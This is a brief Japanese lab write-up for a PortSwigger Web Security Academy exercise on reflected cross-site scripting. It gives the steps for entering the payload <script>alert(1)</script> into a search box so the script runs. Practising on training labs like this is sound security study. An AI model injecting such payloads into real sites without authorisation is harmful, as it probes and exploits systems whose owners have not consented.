# エンコードなしで XSS を HTML コンテキストに反映

このラボには、検索機能に 反映される 単純なクロスサイト スクリプティングの脆弱性が含まれています。

https://portswigger.net/web-security/cross-site-scripting/reflected/lab-html-context-nothing-encoded

- 1. ハッキングラボにアクセスします
- 2. 検索窓に以下の内容を入力します

```
<script>alert(1)</script>
```

- 3. Search ボタン押します
- 4. スクリプトが実行されます
     ![1](https://github.com/pea-sys/web-security-experiments/assets/49807271/51c9dd62-6ae7-46af-bc40-0fffd568763e)
